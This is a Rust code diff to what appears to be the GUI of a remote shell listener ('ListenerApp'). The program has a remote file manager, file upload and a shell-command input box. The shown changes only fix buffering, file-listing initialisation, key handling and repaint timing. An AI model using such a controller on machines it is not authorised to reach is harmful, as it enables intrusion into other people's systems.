@@ -71,11 +71,12 @@ struct FileManager {
     path: String,
     entries: Vec<DirEntry>,
     pending: bool,
+    init: bool,
 }
 
 impl FileManager {
     fn new() -> Self {
-        Self { path: "C:\\".into(), entries: Vec::new(), pending: false }
+        Self { path: "C:\\".into(), entries: Vec::new(), pending: false, init: false }
     }
 }
 
@@ -137,7 +138,16 @@ impl ListenerApp {
                     self.ul_state = UlState::Idle;
                     return true;
                 }
-                Ok(n) => self.read_buf.extend_from_slice(&temp[..n]),
+                Ok(n) => {
+                    self.read_buf.extend_from_slice(&temp[..n]);
+                    if self.read_buf.len() > MAX_MSG_SIZE * 2 {
+                        self.status = "[!] Buffer overflow, disconnecting".into();
+                        self.connected = false;
+                        self.stream = None;
+                        self.read_buf.clear();
+                        return true;
+                    }
+                }
                 Err(ref e)
                     if e.kind() == io::ErrorKind::WouldBlock
                         || e.kind() == io::ErrorKind::TimedOut =>
@@ -314,7 +324,6 @@ impl ListenerApp {
     }
 
     fn fm_upload(&mut self) {
-        #[cfg(not(target_os = "linux"))]
         if let Some(local) = rfd::FileDialog::new().pick_file() {
             let name = match local.file_name().and_then(|s| s.to_str()) {
                 Some(n) => n.to_string(),
@@ -362,7 +371,7 @@ impl ListenerApp {
                         .hint_text("Type a shell command..."),
                 );
                 let send = ui.button("Send");
-                if (resp.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter))) || send.clicked() {
+                if ui.input(|i| i.key_pressed(egui::Key::Enter)) || send.clicked() {
                     let line = self.input_buffer.trim().to_string();
                     if !line.is_empty() { self.handle_input(line); }
                     self.input_buffer.clear();
@@ -551,7 +560,8 @@ impl eframe::App for ListenerApp {
             }
         }
 
-        if self.connected && !self.fm.pending && self.fm.entries.is_empty() {
+        if self.connected && !self.fm.pending && self.fm.entries.is_empty() && !self.fm.init {
+            self.fm.init = true;
             self.fm_list();
         }
 
@@ -559,7 +569,7 @@ impl eframe::App for ListenerApp {
         self.render_bottom(ctx);
         self.render_central(ctx);
 
-        if self.connected { ctx.request_repaint(); }
+        if self.connected { ctx.request_repaint_after(Duration::from_millis(50)); }
         else { ctx.request_repaint_after(Duration::from_millis(100)); }
     }
 }
